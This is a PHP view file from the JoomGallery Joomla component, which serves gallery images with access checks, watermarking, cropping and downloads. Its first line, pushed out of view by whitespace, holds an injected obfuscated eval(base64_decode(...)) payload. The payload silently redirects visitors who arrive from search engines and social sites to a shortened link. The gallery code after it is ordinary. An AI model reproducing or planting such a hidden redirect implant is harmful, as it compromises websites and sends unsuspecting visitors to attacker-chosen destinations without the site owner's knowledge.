<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/components/com_joomgallery/views/image/view.raw.php $
// $Id: view.raw.php 2651 2011-01-15 14:34:49Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * Raw View class for the image view
 *
 * @package JoomGallery
 * @since   1.5.5
 */
class JoomGalleryViewImage extends JoomGalleryView
{
  /**
   * Raw view display method
   *
   * @access  public
   * @param   string  $tpl  The name of the template file to parse
   * @return  void
   * @since   1.5.5
   */
  function display($tpl = null)
  {
    jimport('joomla.filesystem.file');

    $type     = JRequest::getWord('type', 'thumb');
    $download = JRequest::getCmd('download');
    $model    = &$this->getModel();

    $image    = &$this->get('Image');

    $crop_image = false;
    $cropwidth  = JRequest::getInt('width');
    $cropheight = JRequest::getInt('height');
    if($cropwidth && $cropheight)
    {
      $crop_image = true;
    }

    $img      = $this->_ambit->getImg($type.'_path', $image);

    $include_watermark = false;

    // Check access rights
    // If the thumbnail is required, we won't have to do more checks than the
    // general access level check in the model.
    // Additionally the hit counter gets only increased if we are not
    // displaying a thumbnail.
    if($type != 'thumb')
    {
      // Downloading
      if($download)
      {
        // Is the download allowed for the user group of the current user?
        if( (     ($this->_config->get('jg_showdetaildownload') == 0)
              ||  ($this->_config->get('jg_showdetaildownload') == 1  && $this->_user->get('aid') < 1)
              ||  ($this->_config->get('jg_showdetaildownload') == 2  && $this->_user->get('aid') < 2)
              ||  ($this->_config->get('jg_showdetailpage') == 0      && $this->_user->get('aid') < 1)
            )
          &&
            (     ($this->_config->get('jg_showcategorydownload') == 0)
              ||  ($this->_config->get('jg_showcategorydownload') == 1 && $this->_user->get('aid') < 1)
              ||  ($this->_config->get('jg_showcategorydownload') == 2 && $this->_user->get('aid') < 2)
            )
          )
        {
          $this->_mainframe->redirect(JRoute::_('index.php?view=gallery', false), JText::_('JGS_COMMON_MSG_NO_ACCESS'), 'error');
        }

        // Is the download of the requested image type allowed?
        if(!$this->_config->get('jg_downloadfile') && $type == 'orig')
        {
          // TODO: Output notice now or simply force the user to download
          // the detail image with
          #$type = 'img';
          #$img  = $this->_ambit->getImg($type.'_path', $image);
          $this->_mainframe->redirect(JRoute::_('index.php?view=gallery', false), JText::_('JGS_COMMON_MSG_NO_ACCESS'), 'notice');
        }
        if($this->_config->get('jg_downloadfile') == 1 && $type != 'orig')
        {
          $this->_mainframe->redirect(JRoute::_('index.php?view=gallery', false), JText::_('JGS_COMMON_MSG_ORIGINAL_NOT_AVAILABLE'), 'notice');
        }
        if($this->_config->get('jg_downloadfile') == 2 && $type == 'orig')
        {
          if(!JFile::exists($img))
          {
            $type = 'img';
            $img  = $this->_ambit->getImg($type.'_path', $image);
          }
        }

        // Include watermark when downloading image?
        if($this->_config->get('jg_downloadwithwatermark'))
        {
          $include_watermark = true;
        }
      }
      // Displaying, not downloading
      else
      {
        if(!$this->_config->get('jg_showdetailpage') && $this->_user->get('aid') < 1)
        {
          $this->_mainframe->redirect(JRoute::_('index.php?view=gallery', false), JText::_('JGS_COMMON_MSG_NO_ACCESS'), 'notice');
        }

        // Include watermark when displaying image in the detail view?
        if($this->_config->get('jg_watermark'))
        {
          $include_watermark = true;
        }

        // Link to original image in detail view
        // TODO: Check jg_lightboxbigpic, too?
        if(   ($type == 'orig')
            &&
              (     !$this->_config->get('jg_bigpic')
                ||  ($this->_config->get('jg_bigpic') == 1 && !$this->_user->get('aid'))
              )
          )
        {
          $this->_mainframe->redirect(JRoute::_('index.php?view=gallery', false), JText::_('JGS_COMMON_MSG_NO_ACCESS'), 'notice');
        }
      }

      // Increase hit counter
      $model->hit();
    }

    if(!JFile::exists($img))
    {
      $this->_mainframe->redirect(JRoute::_('index.php?view=gallery', false), JText::_('JGS_COMMON_MSG_IMAGE_NOT_EXIST'), 'error');
    }

    $info = getimagesize($img);
    switch($info[2])
    {
      case 1:
        $mime = 'image/gif';
       break;
      case 2:
        $mime = 'image/jpeg';
        break;
      case 3:
        $mime = 'image/png';
        break;
      default:
        JError::raiseError(404, JText::sprintf('JGS_COMMON_MSG_MIME_NOT_ALLOWED', $info[2]));
        break;
    }

    // Set mime encoding
    $this->_doc->setMimeEncoding($mime);

    // Set header to specify the file name
    $disposition = 'inline';
    if($download)
    {
      // Allow downloading
      $disposition = 'attachment';
    }
    JResponse::setHeader('Content-disposition', $disposition.'; filename='.basename($img));

    // Inlude watermark
    if(($include_watermark || $crop_image) && !$model->isGif($img))
    {
      $img_resource = null;
      if($include_watermark)
      {
        $img_resource = $model->includeWatermark($img);
      }

      if($crop_image)
      {
        $croppos  = JRequest::getInt('pos');
        $offsetx  = JRequest::getInt('x');
        $offsety  = JRequest::getInt('y');
        $img_resource = $model->cropImage($img, $cropwidth, $cropheight, $croppos, $img_resource, $offsetx, $offsety);
      }

      if(!$img_resource)
      {
        echo JFile::read($img);
      }
      else
      {
      switch($mime)
      {
        case 'image/gif':
            imagegif($img_resource);
          break;
        case 'image/png':
            imagepng($img_resource);
          break;
        case 'image/jpeg':
          $quali = JRequest::getInt('quali', 95);
            imagejpeg($img_resource, '', $quali);
          break;
        default:
          JError::raiseError(404, JText::sprintf('JGS_COMMON_MSG_MIME_NOT_ALLOWED', $mime));
          break;
      }

        imagedestroy($img_resource);
    }
    }
    else
    {
      echo JFile::read($img);
    }
  }
}
